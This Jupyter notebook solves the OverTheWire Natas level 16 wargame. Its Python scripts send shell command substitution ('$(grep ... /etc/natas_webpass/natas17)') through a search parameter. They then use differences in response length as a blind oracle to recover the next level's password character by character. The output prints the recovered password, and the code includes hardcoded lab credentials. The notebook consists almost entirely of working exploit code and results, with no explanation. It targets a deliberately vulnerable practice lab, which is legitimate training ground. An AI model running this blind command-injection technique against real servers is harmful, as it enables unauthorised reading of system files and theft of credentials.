{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# all dictionary len 461926\n",
    "\n",
    "# no result len 1105"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b 61199\n",
      "d 133996\n",
      "h 76401\n",
      "k 31251\n",
      "m 93639\n",
      "n 237796\n",
      "s 299725\n",
      "u 114946\n",
      "v 40357\n",
      "B 61199\n",
      "C 143024\n",
      "E 316957\n",
      "H 76401\n",
      "I 265688\n",
      "K 31251\n",
      "L 157897\n",
      "R 238240\n",
      "S 299725\n",
      "U 114946\n",
      "X 11363\n",
      "0 1105\n",
      "1 1105\n",
      "7 1105\n",
      "9 1105\n",
      "['b', 'd', 'h', 'k', 'm', 'n', 's', 'u', 'v', 'B', 'C', 'E', 'H', 'I', 'K', 'L', 'R', 'S', 'U', 'X', '0', '1', '7', '9']\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "# get all characters in the password\n",
    "key_list = []\n",
    "key = \"x\"\n",
    "for c in \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\":\n",
    "    command = \"$(grep -oh {0} /etc/natas_webpass/natas17)\".format(c)\n",
    "    url = f\"http://natas16.natas.labs.overthewire.org/index.php?needle={command}&submit=Search\"\n",
    "    response = requests.get(url, auth=(\"natas16\", \"TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V\"))\n",
    "    if len(response.text) != 461926:\n",
    "        print(c, len(response.text))\n",
    "        key_list.append(c)\n",
    "\n",
    "print(key_list)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'bdhkmnsuvBCEHIKLRSUX0179'"
      ]
     },
     "execution_count": 45,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"\".join(key_list)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--------------------------------------------------\n",
      "current password: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7s\n",
      "--------------------------------------------------\n",
      "trying: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sdb\n",
      "trying: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sdd\n",
      "trying: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sdh\n",
      "trying: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sdk\n",
      "trying: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sdm\n",
      "trying: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sdn\n",
      "trying: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sds\n",
      "trying: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sdu\n",
      "trying: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sdv\n",
      "trying: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sdB\n",
      "trying: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sdC\n",
      "trying: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sdE\n",
      "trying: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sdH\n",
      "trying: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sdI\n",
      "trying: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sdK\n",
      "trying: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sdL\n",
      "trying: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sdR\n",
      "trying: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sdS\n",
      "trying: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sdU\n",
      "trying: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sdX\n",
      "trying: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd0\n",
      "trying: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd1\n",
      "trying: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd7\n",
      "trying: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd9\n",
      "--------------------------------------------------\n",
      "password found: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd\n",
      "--------------------------------------------------\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "from IPython.display import clear_output\n",
    "\n",
    "# get all characters in the password\n",
    "\n",
    "key = \"\"\n",
    "while True:\n",
    "    for c in 'bdhkmnsuvBCEHIKLRSUX0179':\n",
    "        new_key = key + c\n",
    "        print(f\"trying: {new_key}\")\n",
    "        command = \"$(grep -oh ^{0} /etc/natas_webpass/natas17)\".format(new_key)\n",
    "        url = f\"http://natas16.natas.labs.overthewire.org/index.php?needle={command}&submit=Search\"\n",
    "        response = requests.get(url, auth=(\"natas16\", \"TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V\"))\n",
    "        if len(response.text) != 461926:\n",
    "            clear_output()\n",
    "            key = new_key\n",
    "            print(\"-\" * 50)\n",
    "            print(f\"current password: {key}\")\n",
    "            print(\"-\" * 50)\n",
    "            break\n",
    "    else:\n",
    "        break\n",
    "\n",
    "print(\"-\" * 50)\n",
    "print(f\"password found: {key}\")\n",
    "print(\"-\" * 50)\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
